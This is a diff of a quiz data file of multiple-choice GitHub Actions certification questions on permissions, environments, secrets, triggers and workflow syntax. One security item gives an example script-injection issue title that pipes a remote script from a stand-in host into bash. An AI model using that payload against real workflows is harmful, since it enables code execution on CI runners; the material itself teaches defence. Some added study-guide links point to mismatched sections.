+ c:1, e:"Public repos should stay on GitHub-hosted runners entirely to sidestep the fork-PR attack surface. Private repos without GPU needs get a general group; GPU access should be scoped narrowly to only the 2 repos that actually need it — least privilege applied to runner group design. 🔗 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Related diagram: Chapter 4 §4.2 (runner group structure for this exact scenario)</a>."},
 
 {d:"enterprise", q:"An org wants to allow its own internal actions plus a small, explicit list of vetted third-party actions, while blocking everything else. Which policy tier fits?",
  o:["Allow all actions and reusable workflows","Allow <enterprise/org>, and select non-<enterprise/org>, actions and reusable workflows","Allow <enterprise/org> actions and reusable workflows only","Disable actions entirely"],
- c:1, e:"The 'select actions' tier is the one that combines local/enterprise actions with an explicit allowlist of specific external actions — the strict enterprise-only tier has no allowlist mechanism at all."},
+ c:1, e:"The 'select actions' tier is the one that combines local/enterprise actions with an explicit allowlist of specific external actions — the strict enterprise-only tier has no allowlist mechanism at all. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
 
-// ---------------- SECURE & OPTIMIZE AUTOMATION (9) ----------------
+{d:"enterprise", q:"A team wants a human to explicitly approve a workflow run before it's allowed to deploy to production, with the job genuinely pausing and waiting. Which mechanism actually does this?",
+ o:["An if: condition checking github.actor against an approved-users list","A GitHub Environment's required reviewers, set on the environment the deploy job declares","A repository ruleset with a required status check","A workflow_dispatch input of type choice"],
+ c:1, e:"Only Environment protection rules can genuinely pause a job mid-run and wait for a human to click approve. if: conditions evaluate once, instantly, with no mechanism to wait for anything — a very common exam trap. 🔗 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#46-environments--protection-rules-required-reviewers-and-deployment-branch-policies' target='_blank'>Related: Chapter 4 §4.6 (Environments)</a>."},
+{d:"enterprise", q:"A job declares environment: production, which has a 10-minute wait timer and two required reviewers configured. What actually happens when the job is triggered?",
+ o:["The job runs immediately; the wait timer and reviewers are purely informational","The job pauses until required reviewers approve AND the wait timer elapses, while other jobs in the same workflow without an environment: keep running normally","The entire workflow, including unrelated jobs, is blocked until this one job is approved","The wait timer is skipped if a reviewer approves quickly"],
+ c:1, e:"Environment protection rules pause only the job that declares that environment — sibling jobs without an environment: keep running. Both the wait timer and required-reviewer approval must be satisfied (not either/or) before the paused job proceeds. 🔗 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#46-environments--protection-rules-required-reviewers-and-deployment-branch-policies' target='_blank'>Related: Chapter 4 §4.6 (Environments)</a>."},
+{d:"enterprise", q:"A brand-new GitHub Environment is created with no configuration changes beyond its name. By default, which branches are allowed to deploy to it?",
+ o:["Only the default branch (usually main)","No branches — deployment branch policies must be explicitly configured before any branch can deploy","Any branch — there's no restriction until you explicitly configure a deployment branch policy","Only branches with an open, approved pull request"],
+ c:2, e:"Deployment branch policies default to no restriction — any branch can deploy to a freshly created environment until you explicitly opt in to restricting it. This is the same 'safe defaults require an explicit lockdown' pattern seen elsewhere (e.g., runner group public-repo visibility). 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
+{d:"enterprise", q:"A job does NOT declare an environment: key. Can it still access secrets that were configured specifically on a GitHub Environment named 'production'?",
+ o:["Yes, all secrets in the repo are always visible to every job","No — environment-scoped secrets are only resolved for jobs that explicitly declare environment: production (or whichever name matches)","Yes, but only if the job has permissions: secrets: read","No, environment secrets are never accessible from any job, only via the API"],
+ c:1, e:"Environment secrets (and variables) are resolved only for jobs that explicitly declare that environment: — this is the same mechanism that also enforces that environment's protection rules, doing double duty as both a secrets scope and an approval gate. 📖 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#42-self-hosted-runner-groups' target='_blank'>Study guide: Chapter 4 §4.2 — Self-Hosted Runner Groups</a>."},
+
+{d:"enterprise", q:"An organization has a secret named API_KEY set at the org level (scoped to all repos), and a repository also defines its own secret named API_KEY. Which value does a workflow in that repository actually see?",
+ o:["Both values, concatenated","The organization-level value always wins, since it's set by administrators","The repository-level value — the most specific level visible to the job always wins, silently shadowing the less specific one","It's ambiguous and the workflow fails with a duplicate-secret error"],
+ c:2, e:"Secret and variable resolution follows most-specific-wins: environment beats repository beats organization. The job never sees both or merges them — the repo-level API_KEY silently shadows the org-level one of the same name, with no error and no visible warning. 🔗 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#48-secret-and-variable-precedence-across-levels' target='_blank'>Related: Chapter 4 §4.8 (secret/variable precedence)</a>."},
+{d:"enterprise", q:"An organization-level variable DEPLOY_REGION is scoped to a selected list of repositories, and repo-x is not on that list. What does a workflow in repo-x see when it references vars.DEPLOY_REGION (assuming no repo- or environment-level variable of that name exists there)?",
+ o:["An empty string","The organization's default region value regardless of scoping","Nothing — vars.DEPLOY_REGION is simply undefined/empty for repo-x, as if the org-level variable doesn't exist for that repo at all","A permissions error at workflow parse time"],
+ c:2, e:"Organization-level secrets/variables scoped to a selected subset of repos are only visible to repos on that list — a repo outside the selection doesn't see an empty or default value, the variable behaves as if it were never defined for that repo. 🔗 <a href='https://karthikreddy432.github.io/GH200/04_chapter_manage_enterprise.html#48-secret-and-variable-precedence-across-levels' target='_blank'>Related: Chapter 4 §4.8 (secret/variable precedence)</a>."},
+
+// ---------------- SECURE & OPTIMIZE AUTOMATION (19) ----------------
 {d:"security", q:"What is 'scope zeroing' in the context of the permissions: block?",
  o:["All permissions default to write access unless explicitly restricted","The moment you specify any individual permission, every permission you did NOT mention is set to none — not left at whatever the prior default was","It refers to zeroing out a repository's billing usage","It only applies to self-hosted runners"],
- c:1, e:"Specifying even one permission triggers scope zeroing: everything unmentioned becomes none. This is what makes least-privilege practical — you declare what you need, and everything else is denied automatically. 🔗 Try it: <a href='08_interactive_companion.html#perms' target='_blank'>Interactive Companion → Permission Scoping tab</a>."},
+ c:1, e:"Specifying even one permission triggers scope zeroing: everything unmentioned becomes none. This is what makes least-privilege practical — you declare what you need, and everything else is denied automatically. 🔗 Try it: <a href='08_interactive_companion.html#perms' target='_blank'>Interactive Companion → Permission Scoping tab</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Study guide: Chapter 5 §5.1 — GITHUB_TOKEN & Scoping</a>."},
 {d:"security", q:"A workflow sets `permissions: { contents: read }` at the top level. A specific job then sets its own `permissions: { issues: write }`. What access does that job's GITHUB_TOKEN actually have?",
  o:["contents: read AND issues: write, merged together","Only issues: write — everything else, including contents, is none for this job, because job-level permissions completely replace (not merge with) workflow-level permissions","Only contents: read, since workflow-level settings take priority","Both permissions plus the repo's org-wide default"],
- c:1, e:"A job-level permissions: block completely replaces the workflow-level one for that job — it does not merge. Since this job only specifies issues: write, contents (and everything else) becomes none for it specifically."},
+ c:1, e:"A job-level permissions: block completely replaces the workflow-level one for that job — it does not merge. Since this job only specifies issues: write, contents (and everything else) becomes none for it specifically. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Study guide: Chapter 5 §5.1 — GITHUB_TOKEN & Scoping</a>."},
 {d:"security", q:"A pull request comes from a fork. Under a plain `pull_request` trigger, what access does GITHUB_TOKEN have, regardless of what permissions: requests?",
  o:["Full write access, since permissions: always overrides fork restrictions","Read-only, with no access to secrets — a hardcoded safety floor that workflow YAML cannot override under pull_request","The same access as a same-repo PR","It depends solely on the contributor's GitHub plan"],
- c:1, e:"Fork PRs under pull_request always get a read-only token with zero secrets access, regardless of what permissions: says — this is a hardcoded floor (pull_request_target is the exception, with its own serious risks)."},
+ c:1, e:"Fork PRs under pull_request always get a read-only token with zero secrets access, regardless of what permissions: says — this is a hardcoded floor (pull_request_target is the exception, with its own serious risks). 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#52-the-pull_request-vs-pull_request_target-trap' target='_blank'>Study guide: Chapter 5 §5.2 — pull_request vs pull_request_target</a>."},
 {d:"security", q:"A workflow triggers on pull_request_target, checks out the fork's HEAD commit, then runs `npm install && npm test` using secrets available to the base repo. Why is this dangerous?",
  o:["It isn't dangerous — pull_request_target is designed for exactly this pattern","pull_request_target grants base-repo privileges (including secrets) even for fork PRs, so executing the fork's own code (install scripts, test files) in that context lets an anonymous contributor run arbitrary code with those privileges","npm install always fails on forked code, so this is just a bug, not a security issue","This pattern is only risky if the repository is private"],
- c:1, e:"This exact anti-pattern has caused real supply-chain compromises: pull_request_target's elevated, secret-bearing context combined with executing untrusted fork code (via any install/build/test script) is a direct path to credential theft. 🔗 <a href='05_chapter_secure_optimize.md#52-the-pull_request-vs-pull_request_target-trap' target='_blank'>Related diagram: Chapter 5 §5.2 (safe two-workflow split)</a> — or try the <a href='08_interactive_companion.html#prtarget' target='_blank'>Interactive Companion's PR Trigger Simulator tab</a> with these exact settings."},
+ c:1, e:"This exact anti-pattern has caused real supply-chain compromises: pull_request_target's elevated, secret-bearing context combined with executing untrusted fork code (via any install/build/test script) is a direct path to credential theft. 🔗 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#52-the-pull_request-vs-pull_request_target-trap' target='_blank'>Related diagram: Chapter 5 §5.2 (safe two-workflow split)</a> — or try the <a href='08_interactive_companion.html#prtarget' target='_blank'>Interactive Companion's PR Trigger Simulator tab</a> with these exact settings."},
 {d:"security", q:"What's the safe way to both build/test a fork's code AND post a privileged comment/result using base-repo secrets?",
  o:["Use pull_request_target for the whole thing and just be careful","Split into two workflows: one on pull_request (safe, fork code, no secrets) that uploads results as an artifact, and a second on workflow_run (privileged, base-repo context) that downloads the artifact and posts the result — never executing the fork's code directly","Grant the fork PR contributor temporary write access to the repo","Disable secrets entirely for the repository"],
- c:1, e:"The two-workflow split keeps fork code execution entirely within the safe, secret-free pull_request context, while the privileged workflow_run step only ever touches an already-built artifact — never the fork's raw code."},
+ c:1, e:"The two-workflow split keeps fork code execution entirely within the safe, secret-free pull_request context, while the privileged workflow_run step only ever touches an already-built artifact — never the fork's raw code. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#52-the-pull_request-vs-pull_request_target-trap' target='_blank'>Study guide: Chapter 5 §5.2 — pull_request vs pull_request_target</a>."},
 {d:"security", q:"A deploy workflow using aws-actions/configure-aws-credentials suddenly fails with 'Could not load credentials from any providers,' with no changes to the steps: block. What's the likely cause?",
  o:["AWS servers are down","A permissions change (e.g., an org-wide GITHUB_TOKEN default tightening) removed the implicit id-token: write this workflow relied on for OIDC — the fix is adding permissions: { id-token: write } explicitly","The IAM role was deleted","The runner's clock is out of sync"],
- c:1, e:"OIDC cloud-auth actions require id-token: write explicitly. Without it, they silently fail and fall back to looking for static credentials that were never configured — producing this confusing, generic error rather than an obvious permissions message. 🔗 <a href='05_chapter_secure_optimize.md#53-oidc--keyless-cloud-authentication' target='_blank'>Related diagram: Chapter 5 §5.3 (OIDC keyless auth sequence)</a>."},
+ c:1, e:"OIDC cloud-auth actions require id-token: write explicitly. Without it, they silently fail and fall back to looking for static credentials that were never configured — producing this confusing, generic error rather than an obvious permissions message. 🔗 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#54-oidc--keyless-cloud-authentication' target='_blank'>Related diagram: Chapter 5 §5.4 (OIDC keyless auth sequence)</a>."},
 {d:"security", q:"A team wants to require a human to manually approve a workflow job before it can deploy to production. What's the correct mechanism?",
  o:["An if: condition checking a manual input","Environment protection rules (required reviewers) on the production environment — if: conditions cannot pause and wait for human approval","A workflow_dispatch input asking 'Are you sure?'","There is no way to require human approval in GitHub Actions"],
- c:1, e:"Only Environment protection rules (required reviewers, wait timers) can actually pause a job pending human approval. An if: expression evaluates once and cannot wait for external input."},
+ c:1, e:"Only Environment protection rules (required reviewers, wait timers) can actually pause a job pending human approval. An if: expression evaluates once and cannot wait for external input. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Study guide: Chapter 5 §5.1 — GITHUB_TOKEN & Scoping</a>."},
 {d:"security", q:"Which uses: pinning strategy provides a cryptographic, immutable guarantee that the referenced code cannot silently change?",
  o:["@main","@v1","@v1.2.3","A full commit SHA, e.g. @8f4b7f84864484a7bf31766abe9204da3cbe65b3"],
- c:3, e:"Tags (@v1, @v1.2.3) rely on a maintainer's convention and can technically be repointed. Only a full commit SHA is cryptographically immutable — the current recommendation for security-sensitive third-party action references."},
+ c:3, e:"Tags (@v1, @v1.2.3) rely on a maintainer's convention and can technically be repointed. Only a full commit SHA is cryptographically immutable — the current recommendation for security-sensitive third-party action references. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#56-supply-chain-pinning-recap-and-extension' target='_blank'>Study guide: Chapter 5 §5.6 — Supply-Chain Pinning</a>."},
 {d:"security", q:"An org's CI bill has grown significantly with no clear single cause. What's the typical, most impactful order of things to check first?",
  o:["Runner OS choice, then workflow naming conventions, then repo description length","Matrix bloat (unnecessary combinations), then missing caching, then missing concurrency cancellation of superseded runs, then docs-only changes triggering full CI unnecessarily","Whether contributors use dark mode in the GitHub UI","The number of collaborators on the repository"],
- c:1, e:"Cost/performance questions on the exam are usually scenario-based, and the expected diagnostic order is roughly: matrix bloat → missing caching → no concurrency cancellation → docs-only triggers running expensive CI, in that order of common-and-fixable."},
+ c:1, e:"Cost/performance questions on the exam are usually scenario-based, and the expected diagnostic order is roughly: matrix bloat → missing caching → no concurrency cancellation → docs-only triggers running expensive CI, in that order of common-and-fixable. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Study guide: Chapter 5 §5.1 — GITHUB_TOKEN & Scoping</a>."},
+
+{d:"security", q:"A workflow triggered by the issues event runs: `run: echo \"New issue: ${{ github.event.issue.title }}\"`. What's the actual vulnerability here, independent of anything about pull_request_target?",
+ o:["There is no vulnerability — issues events can't carry executable content","Script injection: the raw issue title is substituted directly into the shell command text before the shell runs it, so a title like '\"; curl evil.sh | bash #' executes as real shell commands","The workflow will fail to parse because ${{ }} can't be used inside echo","The vulnerability only exists if the repo is public"],
+ c:1, e:"GitHub Actions substitutes ${{ }} expressions as raw text into the YAML before the shell ever sees it. An attacker-controlled issue title becomes literal shell syntax, not inert data — this requires no special trigger like pull_request_target, just any event exposing user-controlled text to a run: step. 🔗 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#53-script-injection-via-untrusted-input' target='_blank'>Related: Chapter 5 §5.3 (Script Injection)</a>."},
+{d:"security", q:"What is the correct fix for a run: step that currently interpolates ${{ github.event.pull_request.title }} directly into a shell command?",
+ o:["Remove the step entirely — there's no safe way to use PR titles","Assign it to an env: variable first, then reference it in the shell as $VAR_NAME — the value is then read as inert data, not re-parsed as command syntax","Wrap the expression in single quotes inside the run: string","Switch the trigger from pull_request to pull_request_target"],
+ c:1, e:"Routing the value through env: means the substitution happens once, into a variable's value; the shell then reads $VAR_NAME as plain data rather than re-parsing the original text as shell syntax. Quoting inside run: does not fix this, and switching triggers addresses a different vulnerability (§5.2) entirely. 🔗 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#53-script-injection-via-untrusted-input' target='_blank'>Related: Chapter 5 §5.3 (Script Injection)</a>."},
+{d:"security", q:"A custom action's step that uploads SARIF results via github/codeql-action/upload-sarif suddenly starts failing with a 403, even though permissions: contents: write is set. Which permission key is most likely missing?",
+ o:["issues: write","security-events: write","packages: write","checks: write"],
+ c:1, e:"Uploading code-scanning SARIF results requires security-events: write specifically — contents: write does not cover it. This is one of two permission keys the exam calls out as easy to under-scope by habit (the other being id-token). 🔗 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Related: Chapter 5 §5.1 (GITHUB_TOKEN permission table)</a>."},
+{d:"security", q:"A team adds actions/attest-build-provenance to their release workflow so downstream users can verify the published binary's origin. Which permission must be added alongside attestations: write for this to work, and why?",
+ o:["packages: write, because attestations are stored as packages","id-token: write, because attestations are cryptographically signed using the workflow's own OIDC identity, the same mechanism as cloud OIDC auth","contents: write, because attestations modify the repository directly","No additional permission is needed beyond attestations: write"],
+ c:1, e:"Artifact attestations are signed via the workflow's OIDC identity, so id-token: write is required exactly as it is for cloud OIDC authentication (§5.4) — same underlying mechanism, different consumer. Attestations protect downstream consumers of your artifacts from tampering; this is the mirror image of SHA-pinning, which protects you from tampered dependencies you consume. 🔗 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#56-supply-chain-pinning-recap-and-extension' target='_blank'>Related: Chapter 5 §5.6 (Artifact Attestations)</a>."},
+// ---------------- AUTHOR & MANAGE WORKFLOWS (10 NEW) ----------------
+{d:"workflows", q:"A workflow uses both `branches:` and `branches-ignore:` under the same  Exam hint: Same-event `branches`/`branches-ignore` pairs are mutually exclusive; use `!` patterns when you need both inclusion and exclusion. 🔗 <a href='https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/trigger-a-workflow' target='_blank'>Official docs: Workflow filters</a>.`push:` event. What will happen?",
+ o:[
+   "Both are evaluated; branches-ignore takes precedence",
+   "Both are evaluated; branches takes precedence",
+   "GitHub Actions rejects the workflow configuration because the filters are mutually exclusive",
+   "The workflow silently ignores branches-ignore"
+ ],
+ c:2, e:"For the same event, `branches` and `branches-ignore` are mutually exclusive. The same rule applies to `paths` and `paths-ignore`. If both inclusion and exclusion are needed, use the positive filter with `!` negated patterns. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#11-events-that-trigger-workflows' target='_blank'>Study guide: Chapter 1 §1.1 — Events That Trigger Workflows</a>."},
+
+{d:"workflows", q:"A workflow step pushes a commit back to the repository using the automatic `secrets.GITHUB_TOKEN`. Why does that push normally NOT trigger another workflow configured with `on: push`?",
+ o:[
+   "GITHUB_TOKEN cannot push commits to repositories",
+   "GitHub prevents events created by the automatic GITHUB_TOKEN from creating new workflow runs",
+   "Push events from Actions are delayed until the next scheduled workflow run",
+   "A workflow must enable `allow-recursive-triggers: true`"
+ ],
+ c:1, e:"GitHub prevents the repository's automatic GITHUB_TOKEN from creating events that start new workflow runs, preventing accidental recursive workflow loops. A different authentication mechanism, such as an appropriate PAT or GitHub App token, can be used when a downstream workflow must be triggered. Exam hint: remember the recursion-prevention rule and its documented exceptions. 🔗 <a href='https://docs.github.com/en/actions/concepts/security/github_token' target='_blank'>Official docs: GITHUB_TOKEN workflow triggers</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/05_chapter_secure_optimize.html#51-github_token--default-behavior-and-scoping' target='_blank'>Study guide: Chapter 5 §5.1 — GITHUB_TOKEN & Scoping</a>."},
+
+{d:"workflows", q:"A setup job exposes this JSON output: `{\"include\":[{\"os\":\"ubuntu-latest\",\"node\":\"20\"},{\"os\":\"windows-latest\",\"node\":\"22\"}]}`. How should a downstream job use it as a dynamic matrix?",
+ o:[
+   "matrix: ${{ needs.setup.outputs.matrix }}",
+   "matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}",
+   "strategy: dynamic-matrix: ${{ needs.setup.outputs.matrix }}",
+   "matrix: ${{ JSON.parse(needs.setup.outputs.matrix) }}"
+ ],
+ c:1, e:"`fromJSON()` converts a JSON-formatted string into an Actions object or array that can be used by the matrix strategy. The downstream job must depend on the producing job with `needs: setup`. Exam hint: Job outputs arrive as strings; `fromJSON()` converts the JSON string into the matrix object. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax' target='_blank'>Official docs: Workflow syntax / matrix</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#15-matrix-builds' target='_blank'>Study guide: Chapter 1 §1.5 — Matrix Builds</a>."},
+
+{d:"workflows", q:"A step executes `echo \"TARGET_ENV=production\" >> \"$GITHUB_ENV\"`. When and where is `TARGET_ENV` available?",
+ o:[
+   "Immediately within the current step's shell",
+   "To subsequent steps within the same job",
+   "To every job in the workflow",
+   "Only inside later `if:` expressions"
+ ],
+ c:1, e:"Values written to `$GITHUB_ENV` become environment variables for subsequent steps in the same job. They do not modify the already-running shell process and do not automatically cross job boundaries. Exam hint: GITHUB_ENV affects later steps, not the current process. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands' target='_blank'>Official docs: Environment files</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
+
+{d:"workflows", q:"You need to export a multi-line PEM certificate into `$GITHUB_ENV`. Which syntax correctly uses the environment-file delimiter format?",
+ o:[
+   "echo \"CERT=$CERT_STRING\" >> \"$GITHUB_ENV\"",
+   "printf 'CERT<<EOF\\n%s\\nEOF\\n' \"$CERT_STRING\" >> \"$GITHUB_ENV\"",
+   "export CERT=\"$CERT_STRING\" >> \"$GITHUB_ENV\"",
+   "echo \"::set-env name=CERT::$CERT_STRING\""
+ ],
+ c:1, e:"Multi-line environment-file values require `KEY<<DELIMITER`, followed by the value and a terminating delimiter on its own line. The deprecated `::set-env` command is not the current mechanism. Exam hint: think `NAME<<DELIMITER` plus a terminating delimiter line. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands' target='_blank'>Official docs: Multiline environment files</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
+
+{d:"workflows", q:"A matrix strategy generates 16 job combinations. You want at most 4 matrix jobs executing at the same time. Which setting should you use?",
+ o:[
+   "strategy: max-parallel: 4",
+   "strategy: limit: 4",
+   "concurrency: 4",
+   "strategy: fail-fast: 4"
+ ],
+ c:0, e:"`strategy.max-parallel` limits how many matrix job instances can execute concurrently. It does not reduce the number of matrix combinations; the remaining combinations wait for available execution slots. Exam hint: distinguish matrix throttling from workflow/job concurrency groups. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax' target='_blank'>Official docs: Matrix max-parallel</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#15-matrix-builds' target='_blank'>Study guide: Chapter 1 §1.5 — Matrix Builds</a>."},
+
+{d:"workflows", q:"A step generates a Markdown test report that should appear directly on the GitHub Actions run summary page. Which mechanism should it use?",
+ o:[
+   "Append the Markdown to `$GITHUB_STEP_SUMMARY`",
+   "Emit `::set-summary::`",
+   "Write the report to `.github/summary.md`",
+   "Upload the Markdown file as an artifact named `summary`"
+ ],
+ c:0, e:"`$GITHUB_STEP_SUMMARY` is the environment-file mechanism for adding Markdown content to the workflow run's summary page. Exam hint: this is a runner-provided environment file, not an artifact. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands' target='_blank'>Official docs: GITHUB_STEP_SUMMARY</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
+
+{d:"workflows", q:"You want all `run:` steps in a workflow to default to PowerShell Core and use `./src` as their working directory. Which configuration is appropriate?",
+ o:[
+   "env: { shell: pwsh, working-directory: ./src }",
+   "defaults: { run: { shell: pwsh, working-directory: ./src } }",
+   "jobs: { defaults: { shell: pwsh, path: ./src } }",
+   "Shell and working-directory must always be specified on every step"
+ ],
+ c:1, e:"`defaults.run` can establish default `shell` and `working-directory` values for `run:` steps. Defaults can be defined at workflow or job scope. Exam hint: defaults.run controls shell and working-directory for run steps. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax' target='_blank'>Official docs: defaults.run</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
+
+{d:"workflows", q:"A pull request event contains a `labels` array of objects. Which expression correctly checks whether one of those labels is named `urgent`?",
+ o:[
+   "contains(github.event.pull_request.labels.*.name, 'urgent')",
+   "github.event.pull_request.labels.name == 'urgent'",
+   "in('urgent', github.event.pull_request.labels)",
+   "has(github.event.pull_request.labels, 'urgent')"
+ ],
+ c:0, e:"The object-filter syntax `labels.*.name` projects the array of label objects into their `name` values. `contains()` can then test whether `urgent` is present. Exam hint: project object properties with `*`, then apply `contains()`. 🔗 <a href='https://docs.github.com/en/actions/concepts/workflows-and-actions/expressions' target='_blank'>Official docs: Expressions</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
+
+{d:"workflows", q:"A workflow defines `ENV_VAR: workflow` at workflow scope, `ENV_VAR: job` at job scope, and `ENV_VAR: step` at step scope. What value does the step receive?",
+ o:[
+   "workflow",
+   "job",
+   "step",
+   "The workflow fails because the variable is defined multiple times"
+ ],
+ c:2, e:"More-specific `env` scopes override broader scopes: step-level values override job-level values, which override workflow-level values. Exam hint: the most specific env scope wins. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/variables' target='_blank'>Official docs: Variables reference</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/01_chapter_author_manage_workflows.html#13-contexts-and-expressions' target='_blank'>Study guide: Chapter 1 §1.3 — Contexts and Expressions</a>."},
+
+// ---------------- CONSUME & TROUBLESHOOT WORKFLOWS (4 NEW) ----------------
+{d:"troubleshoot", q:"A step with `id: linter` uses `continue-on-error: true`. The linter exits with code 1. What are `steps.linter.outcome` and `steps.linter.conclusion`?",
+ o:[
+   "outcome is 'failure'; conclusion is 'success'",
+   "outcome is 'success'; conclusion is 'failure'",
+   "Both are 'failure'",
+   "Both are 'success'"
+ ],
+ c:0, e:"`outcome` records the result before `continue-on-error` is applied, so it is `failure`. `conclusion` reflects the final state after the error is tolerated, so it is `success`. Exam hint: outcome is pre-continue-on-error; conclusion is the post-evaluation state. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax' target='_blank'>Official docs: Workflow syntax / continue-on-error</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#21-a-systematic-debugging-workflow' target='_blank'>Study guide: Chapter 2 §2.1 — Systematic Debugging</a>."},
+
+{d:"troubleshoot", q:"A reusable workflow calculates a version number in one of its jobs. How does it expose that value to the workflow that called it?",
+ o:[
+   "The caller reads `steps.<id>.outputs.version` directly",
+   "The reusable workflow maps an `on.workflow_call.outputs` value to an internal job output",
+   "The value must be written to `$GITHUB_CALLER_OUTPUT`",
+   "Reusable workflows cannot return outputs"
+ ],
+ c:1, e:"A reusable workflow must explicitly declare its caller-facing outputs under `on.workflow_call.outputs`, mapping them to a job-level output such as `${{ jobs.build.outputs.version }}`. The job itself must expose the step output through its `outputs:` map. Exam hint: wire step output → job output → workflow_call output. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax' target='_blank'>Official docs: Reusable workflow outputs</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#25-consuming-reusable-workflows-workflow_call' target='_blank'>Study guide: Chapter 2 §2.5 — Consuming Reusable Workflows</a>."},
+
+{d:"troubleshoot", q:"A workflow needs a notification job to run specifically when the workflow run is cancelled by an operator. Which status-check function is appropriate?",
+ o:[
+   "success()",
+   "failure()",
+   "cancelled()",
+   "always()"
+ ],
+ c:2, e:"`cancelled()` evaluates to true when the relevant workflow execution has been cancelled. It is more specific than `always()`, which also runs for successful and failed states. Exam hint: choose the status function that describes cancellation, not every terminal state. 🔗 <a href='https://docs.github.com/en/actions/reference/workflows-and-actions/expressions' target='_blank'>Official docs: Status check functions</a>. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#26-concurrency-control' target='_blank'>Study guide: Chapter 2 §2.6 — Concurrency Control</a>."},
+
+{d:"troubleshoot", q:"A later job runs `actions/download-artifact@v4` without specifying `name:`. Multiple artifacts were uploaded during the workflow run. What is the expected behavior?",
+ o:[
+   "The action fails because `name` is mandatory",
+   "All artifacts are downloaded, with each artifact placed in its own subdirectory",
+   "Only the most recently uploaded artifact is downloaded",
+   "All artifact files are flattened into one directory"
+ ],
+ c:1, e:"When no artifact name is specified, the action downloads all available artifacts from the workflow run and places each artifact's contents in a separate directory named after that artifact. 📖 <a href='https://karthikreddy432.github.io/GH200/02_chapter_consume_troubleshoot_workflows.html#24-caching-vs-artifacts--choose-correctly' target='_blank'>Study guide: Chapter 2 §2.4 — Caching vs Artifacts</a>."},
+
+// ---------------- AUTHOR & MAINTAIN ACTIONS (5 NEW) ----------------
+{d:"actions", q:"A custom JavaScript action provisions temporary cloud credentials and must guarantee cleanup during job teardown even if the main action or later workflow steps fail. Which mechanism is designed for this lifecycle?",
+ o:[
+   "process.on('exit') in the main script",
+   "A separate user-defined cleanup step",
+   "runs.post in action.yml",
+   "A `.github/teardown.sh` file"
+ ],
